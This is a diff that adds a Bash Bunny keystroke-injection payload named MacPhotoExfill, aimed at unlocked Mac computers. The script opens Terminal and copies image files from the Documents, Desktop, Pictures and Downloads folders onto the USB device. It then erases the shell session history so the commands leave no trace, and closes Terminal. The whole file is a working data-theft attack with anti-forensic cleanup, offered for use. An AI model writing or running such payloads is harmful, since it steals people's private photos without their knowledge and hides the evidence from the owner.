@@ -1,0 +1,86 @@
+#!/bin/bash
+#
+# Title:         MacPhotoExfill
+# Author:        afsh4ck
+# Version:       1.1
+# Target:        MacOS
+# Category:      Exfiltration
+#
+# Exfilter all the images from the principal folders on unlocked MacOS targets.
+# Stashes them in /loot/MacPhotoExfill
+#
+# Purple             Setup
+# Amber..............Attack Mode ON
+# Green..............Finished
+
+LED SETUP
+ATTACKMODE HID STORAGE ECM_ETHERNET
+GET TARGET_HOSTNAME
+QUACK DELAY 1000
+
+lootdir=loot/MacPhotoExfill/$TARGET_HOSTNAME
+mkdir -p /root/udisk/$lootdir
+
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 2000
+
+LED STAGE 1
+
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Documents;
+QUACK ENTER
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Desktop;
+QUACK ENTER
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Pictures;
+QUACK ENTER
+QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Downloads;
+QUACK ENTER
+QUACK STRING rsync -av Documents/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Documents ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+QUACK STRING rsync -av Desktop/*.{png,jpg,jpeg} /Volumes/BashBunny/$lootdir/Desktop ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+QUACK STRING rsync -av Pictures/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Pictures ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+QUACK STRING rsync -av Downloads/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Downloads ;
+QUACK ENTER
+QUACK STRING echo "Please wait while the files are copied...";
+QUACK ENTER
+QUACK STRING wait;
+QUACK ENTER
+
+# Ensure sincronization
+sync
+
+# Cleanup and delete proofs
+LED STAGE 2
+QUACK ENTER
+
+# Eject BB storage
+QUACK STRING diskutil eject /Volumes/BashBunny/
+QUACK ENTER
+QUACK DELAY 500
+
+# Remove terminal history from current session (commands used in attack won't be visible with the history command)
+QUACK STRING rm -r ~/.zsh_sessions
+QUACK ENTER
+QUACK DELAY 500
+
+# Exit terminal
+QUACK STRING killall Terminal
+QUACK ENTER
+
+LED FINISH
